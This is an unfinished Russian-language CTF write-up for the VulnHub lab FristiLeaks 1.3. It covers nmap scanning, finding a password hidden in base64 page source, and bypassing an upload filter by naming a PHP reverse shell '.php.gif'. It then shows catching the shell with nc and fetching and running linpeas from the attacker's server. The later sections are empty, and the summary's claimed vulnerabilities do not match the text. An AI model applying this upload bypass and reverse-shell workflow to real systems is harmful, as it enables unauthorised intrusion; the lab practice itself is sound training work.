# VulnHub - Lin Basic - FristiLeaks_1.3

📅 Дата: 2025-07-22  
🧠 Сложность: Basic  
💻 IP-адрес: 192.168.56.128  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -Pn --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=192.168.56.128 && nmap_ctf $ip
```

### nmap  

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|media device|webcam
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (97%), Synology DiskStation Manager 5.X (89%), LG embedded (88%), Tandberg embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/a:synology:diskstation_manager:5.2
Aggressive OS guesses: Linux 2.6.32 - 3.10 (97%), Linux 2.6.32 - 3.13 (97%), Linux 2.6.39 (94%), Linux 2.6.32 - 3.5 (92%), Linux 3.2 - 3.16 (91%), Linux 3.2 - 3.8 (91%), Linux 3.2 - 4.9 (91%), Linux 3.2 (90%), Linux 2.6.32 (90%), Linux 2.6.38 - 3.0 (90%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.026 days (since Mon Jul 21 23:56:39 2025)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=250 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.95 ms 192.168.56.128
```


---

## 🕵️ Enumeration

По ендпоинтам, указанным в `robots.txt` только изображение
```bash
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
```

Скачиваю его и смотрю информацию  
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Basic - FristiLeaks_1.3/exploits]
└─$ wget http://192.168.56.128/images/3037440.jpg -O img.jpg

┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Basic - FristiLeaks_1.3/exploits]
└─$ exiftool img.jpg                                          
ExifTool Version Number         : 12.76
File Name                       : img.jpg
Directory                       : .
File Size                       : 108 kB
File Modification Date/Time     : 2015:11:25 03:50:53-05:00
File Access Date/Time           : 2025:07:22 00:40:16-04:00
File Inode Change Date/Time     : 2025:07:22 00:39:30-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 400
Image Height                    : 400
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 400x400
Megapixels                      : 0.160
```

### Сохраняю имена с главной страницы в файл
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Basic - FristiLeaks_1.3/exploits]
└─$ cat names.txt 
meneer
barrebas
rikvduijn
wez3forsec
PyroBatNL
0xDUDE
annejanbrouwer
Sander2121
Reinierk
DearCharles
miamat
MisterXE
BasB
Dwight
Egeltje
pdersjant
tcp130x10
spierenburg
ielmatani
renepieters
Mystery guest
EQ_uinix
WhatSecurity
mramsmeets
Ar0xA
```

Есть подсказки в исходном коде
![login_br](screenshots/01.login_br.png)

Добавляю ещё одно имя
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Basic - FristiLeaks_1.3/exploits]
└─$ echo "eezeepz" >> names.txt
```

В конце страницы закомментированный код base64, пробую создать `<img \>` на странице, чтобы его посмотреть
```html
<img src="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==" />
```

Похоже на пароль
```
keKkeKKeKKeKkEkkEk
```
![login](screenshots/01.login.png)

В итоге не пришлось брутить, сразу вошел по кредам `eezeepz:keKkeKKeKKeKkEkkEk`

Попробовал загрузить изображение  
![uploads](screenshots/02.uploads.png)

Перехожу в `/uploads`  
![uploads](screenshots/02.uploads_no.png)  

Пробую по имени обратиться  
![uploads](screenshots/02.uploads_yes.png)  

Ок, значит при загрузке файлов имена не меняются и доступны по прямой ссылке.
Пробую загрузить реверс шелл php и получаю ошибку
```
Sorry, is not a valid file. Only allowed are: png,jpg,gif
Sorry, file not uploaded
```

Обошел добавив `.gif` к названию файла
![shell](screenshots/03.uploads_php_gif.png)

Другой вариант не сработал  
![shell](screenshots/04.uploads_gif_php.png)

По первому варианту получаю реверс шелл по url `http://192.168.56.128/fristi/uploads/php-reverse-shell.php.gif` и улучшаю его  
```bash
┌──(kali㉿0x2d-pentest)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.56.106] from (UNKNOWN) [192.168.56.128] 43446
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 02:27:55 up  2:36,  0 users,  load average: 7.68, 7.04, 7.88
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.1$ ^Z
zsh: suspended  nc -lvnp 5555
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 5555
                               export TERM=xterm
bash-4.1$ pwd
/
bash-4.1$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.1$ 
```

Поднимаю сервер
```bash
┌──(kali㉿0x2d-pentest)-[~/Downloads]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

Загружаю `linpeas`
```bash
bash-4.1$ sudo -l
[sudo] password for apache: 
Sorry, try again.

bash-4.1$ cd /tmp
bash-4.1$ wget http://192.168.56.106:8888/linpeas.sh
bash-4.1$ chmod +x ./linpeas.sh
bash-4.1$ ./linpeas.sh
```

### System
```bash
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                               
                               ╚═══════════════════╝                                                              
OS: Linux version 2.6.32-573.8.1.el6.x86_64 (mockbuild@c6b8.bsys.dev.centos.org) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-16) (GCC) ) #1 SMP Tue Nov 10 18:01:38 UTC 2015
User & Groups: uid=48(apache) gid=48(apache) groups=48(apache)
Hostname: localhost.localdomain
```

### Users
```bash
╔══════════╣ Users with console
admin:x:501:501::/home/admin:/bin/bash                                                                            
eezeepz:x:500:500::/home/eezeepz:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

### Soft
```bash
                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                
                             ╚══════════════════════╝                                                             
╔══════════╣ Useful software
/usr/bin/base64                                                                                                   
/usr/bin/curl
/usr/bin/gcc
/usr/bin/lua
/usr/bin/make
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
gcc.x86_64                          4.4.7-16.el6                           @base                                  
/usr/bin/gcc
```



## 📂 Получение доступа



## ⚙️ Привилегии



## 🏁 Флаги

- User flag: 
- Root flag: 

---

## 📋 Резюме

🧰 **Инструменты:**
  - nmap, ffuf, и др.

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Directory Traversal  
  - RCE через уязвимый скрипт  

🛡 **Советы по защите:**
  - Использовать сложные пароли и ограничить число попыток входа
  - Обновлять ПО до актуальных версий
  - Удалять/ограничивать использование SUID-бинарников
  - Настроить логирование и мониторинг системных событий
  - Применять принцип наименьших привилегий


